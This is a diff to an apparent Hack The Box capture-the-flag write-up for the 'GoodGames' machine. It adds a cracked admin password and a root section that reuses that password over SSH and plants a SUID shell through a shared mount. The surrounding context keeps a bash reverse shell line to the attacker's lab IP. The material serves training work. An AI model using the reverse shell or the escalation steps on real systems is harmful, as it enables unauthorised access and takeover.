@@ -1,3 +1,4 @@
+# User
 Nmap
 ```
 └─$ nmap -sCV -p- 10.129.226.138                                                                                                                                                                                                    
@@ -54,7 +55,7 @@ Table: user
 Dump the users table and we find admin credentials
 ```
 admin@goodgames.htb
-2b22337f218b2d82dfc3b6f77e7cb8ec
+2b22337f218b2d82dfc3b6f77e7cb8ec -> superadministrator
 ```
 
 Crack the hash and logging into admin account and clicking on the settings feature we find subdomain:
@@ -90,4 +91,20 @@ bash -i >& /dev/tcp/10.10.14.42/4242 0>&1
 ```
 ```
 HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
-````
+```
+
+# Root
+So scanning the docker host machine on 172.19.0.1 reveals it has ssh open
+We can connect to that using the known username of `augustus` which is the name of the users home dir that the flag is in
+Using the same password as before `superadministrator`
+```
+ssh augustus@172.19.0.1
+```
+
+Going back to the docker container we can copy sh over into the users home as we know that is shared with the host machine.
+We can then use `chmod +s` to set the suid bit allowing users that have access to the file to run it as root
+
+Connecting to the host as the user we now have the suid binary to run which gives us a root shell, then `cat /root/root.txt`.
+```
+HTB{M0un73d_F1l3_Sy57eM5_4r3_DaNg3R0uS}
+```
